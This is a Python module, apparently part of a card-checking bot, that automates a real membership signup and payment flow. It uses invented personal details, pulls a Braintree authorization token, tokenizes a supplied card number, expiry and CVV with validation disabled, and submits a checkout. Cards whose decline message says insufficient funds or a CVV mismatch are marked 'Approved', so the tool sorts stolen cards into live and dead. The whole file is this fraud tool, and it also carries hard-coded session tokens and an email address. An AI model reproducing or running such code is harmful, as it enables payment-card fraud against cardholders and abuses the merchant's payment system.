import requests
import base64
import json
import re
from ....core.logger import log
log.info("Imported braintree on bot")
def cleanhtml(raw_html):
    CLEANR = re.compile('<.*?>') 
    cleantext = re.sub(CLEANR, '', raw_html)
    return cleantext

def Cap( data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None

def first(r):
    post = '''promo=PWEBTOP&PreFix=hfdh&FirstName=jhon&MiddleName=&LastName=doe&Suffix=&S_Street=576+Brown+Avenue&S_City=Seneca&s_state=SC&S_ZipPostal=29678&s_country=USA&Phone=8032011712&Fax=&Email=aircracker2021%40hotmail.com&emailTolerance=Yes&SchoolName=jhon+doe&AcademicStanding=160&GradMonth=February&GradYear=2024&subject=315&degree=360&age=Prefer+not+to+submit&gender=Non-Binary&not_listed=&old_age=&chapter=No&represented=No&represented_writein=&disability=No&disability_writein=&referral=Received++information+package+by+postal+mail.&Other_referral=&offering=UltraLT&nopromodrop=NG&temp_client_no=8170725'''
    headers = {'authority': 'services.acm.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://services.acm.org',
    'referer': 'ttps://services.acm.org/public/qj/quickjoin/qj_control.cfm?promo=PWEBTOP&form_type=Student',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
    first = r.post('https://services.acm.org/public/qj/quickjoin/qj_control.cfm?from=personal_info&CFID=29738785&CFTOKEN=206bef81100bd8fc-0968E391-A38E-8BC4-738BC97A32037E2D',headers = headers ,data = post)
    if not first:
        return
    dump = Cap(first.text,"authorization: '","'")
    be_1 = base64.b64decode(dump).decode('utf-8')
    be_1 = json.loads(be_1)
    berear = be_1['authorizationFingerprint']
    return berear

def second(r , berear , cc , mes , ano , cvv):
    headers = {'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Authorization': f'Bearer {berear}',
    'Braintree-Version': '2018-05-10',
    'Content-Type': 'application/json',
    'Host': 'payments.braintree-api.com',
    'Origin': 'https://assets.braintreegateway.com',
    'Referer': 'https://assets.braintreegateway.com/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
    data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"e0430d13-3dd4-44a1-b2f6-22e9307a0375"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'+cc+'","expirationMonth":"'+mes+'","expirationYear":"'+ano+'","cvv":"'+cvv+'","cardholderName":"jhons miht"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
    second = r.post ('https://payments.braintree-api.com/graphql',headers=headers,data=data)
    if not second:
        return
    sec = json.loads(second.text)
    token = sec['data']['tokenizeCreditCard']['token']
    return token

def third(r , token):
    data = f'promo=PWEBTOP&payment=19&client_no=3679959&ItsDisabled=No&paytype_field=on&paymentmethod_nonce={token}&order_id=12759061'
    headers = {'authority': ',services.acm.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://services.acm.org',
    'referer': 'https://services.acm.org/public/qj/quickjoin/qj_finalprocess.cfm?clientno=3679959&promo=PWEBTOP&CFID=29738785&CFTOKEN=206bef81100bd8fc-0968E391-A38E-8BC4-738BC97A32037E2D',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
    third = r.post('https://services.acm.org/public/qj/quickjoin/qj_checkout.cfm?createdit=0&CFID=29738785&CFTOKEN=206bef81100bd8fc-0968E391-A38E-8BC4-738BC97A32037E2D',data=data,headers=headers)
    third = third.text
    msg = Cap(third,'<div style="color: red">Please try again: ','</div>')

    if 'Card Issuer Declined CVV' in msg:
        return  "Card Issuer Declined CVV", "✅", 'Approved'
    elif 'Insufficient Funds' in msg:
        return "Insufficient Funds","✅","Approved"
    else:
        mess = cleanhtml(msg).strip()
        r_respo = mess if mess else "DECLINED / UNKNOWN ERROR"
        return r_respo, "❌", 'Declined'
